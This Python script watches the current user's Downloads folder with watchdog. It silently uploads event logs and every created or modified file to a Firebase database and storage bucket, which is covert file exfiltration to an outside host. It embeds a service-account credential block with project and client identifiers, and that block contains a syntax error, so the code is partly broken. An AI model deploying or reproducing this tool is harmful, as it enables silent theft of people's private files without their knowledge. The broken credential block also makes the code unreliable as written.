import firebase_admin
from watchdog.observers import Observer
from watchdog.events import LoggingEventHandler
from firebase_admin import db,credentials,storage
import logging
import time
from datetime import datetime
import os

#initializing things
log_dict ={}
dest_prefix = 'test/'
os_name = os.name
credentials_json = {
  "type": "service_account",
  "project_id": "testing-41a99",
  "private_key_id": "5d3a3c85cbfe71d2114d40e8329713da85689905",
  "private_key:: "YOUR PRIVATE KEY"
  "client_email": "firebase-adminsdk-mzzqo@testing-41a99.iam.gserviceaccount.com",
  "client_id": "106835662846284853058",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-mzzqo%40testing-41a99.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

#source_to_monitor
#source_prefix = '/home/parasite/Desktop/project/' #for testing on linux


#function to get downloads folder 
def get_folder():
    dwnld_path = os.path.join(os.path.expanduser('~'),'Downloads')
    return dwnld_path  #C:\Users\localadmin\Downloads\

source_prefix = get_folder()


#setting credentials for the firebase
cred = credentials.Certificate(credentials_json)
firebase_admin.initialize_app(cred,{'databaseURL':'https://testing-41a99-default-rtdb.asia-southeast1.firebasedatabase.app/','storageBucket':'testing-41a99.appspot.com'})
#print("Connected with Database!")

def upload_logs(log):
    #reference to root
    ref = db.reference('/logs')
    log_list = ref.get()
    log_list.append(log)
    ref.set(log_list)


def upload_file(source,dest):
    #create the bucket
    bucket = storage.bucket()
    
    blob = bucket.blob(dest)
    blob.upload_from_filename(source)

    #print(f'Uploaded {source} to {dest} ')



# Define a custom logging handler
class DictLoggingHandler(logging.Handler):
    def __init__(self, log_dict):
        super().__init__()
        self.log_dict = log_dict

    def emit(self, record):
        timestamp = datetime.fromtimestamp(record.created)

        log_data = {
            "message": self.format(record),
            "file_path":self.format(record).split()[2],
            "year": timestamp.year,
            "month": timestamp.month,
            "day": timestamp.day,
            "hour": timestamp.hour,
            "minute": timestamp.minute,
            "second": timestamp.second,
            "process": record.process,
        }
        # Use a unique identifier for each log record, e.g., timestamp
        log_id = str(record.created)
        self.log_dict[log_id] = log_data
           
        #upload logs
        upload_logs(log_data)

        #upload file
        try:
            source_path = log_data["file_path"]
            dest_path = source_path.replace('\\','/')
            dest_path = dest_prefix+dest_path
            #print(source_path)
            #print(dest_path)
            upload_file(source_path,dest_path)
        except:
            pass
     


def monitor(path):
    #print("Monitoring started...")

    #getting logs
    #logging.basicConfig(level=logging.INFO,format='%(asctime)s - %(process)d - %(message)s',datefmt='%d-%m-%Y %H:%M:%S')
    logging_handler = DictLoggingHandler(log_dict)
    logging.basicConfig(level=logging.INFO, handlers=[logging_handler])

    event_handler = LoggingEventHandler()
    observer = Observer()

    observer.schedule(event_handler,path,recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
            observer.stop()
            observer.join()

#path to moniter in term
#path = sys.argv[1] if len(sys.argv) > 1 else '.'
monitor(source_prefix)


